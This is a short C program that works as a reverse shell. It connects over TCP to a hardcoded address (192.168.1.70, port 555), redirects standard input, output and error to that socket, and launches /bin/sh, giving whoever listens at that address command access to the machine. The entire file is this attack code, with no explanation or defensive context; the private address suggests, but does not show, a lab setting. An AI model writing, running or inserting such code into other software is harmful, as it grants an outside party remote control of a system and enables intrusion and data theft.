#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>

int main(int argc,char **argv)
{
	struct sockaddr_in socks = {0};

	int fd = socket(AF_INET, SOCK_STREAM,IPPROTO_TCP);

	if (fd < 0){
		fprintf(stderr,"[-] Error creating socket\n");
		exit(-1);
	}

	socks.sin_addr.s_addr = inet_addr("192.168.1.70");
	socks.sin_port = htons(555);
	socks.sin_family = AF_INET;

	if (connect(fd,(struct sockaddr *)&socks,sizeof(socks)) < 0){
		fprintf(stderr,"[-] Error connecting to remote host\n");
		exit(-1);
	}

	dup2(fd,STDIN_FILENO);
	dup2(fd,STDOUT_FILENO);
	dup2(fd,STDERR_FILENO);

	execve("/bin/sh",NULL,0);

	return (0);
}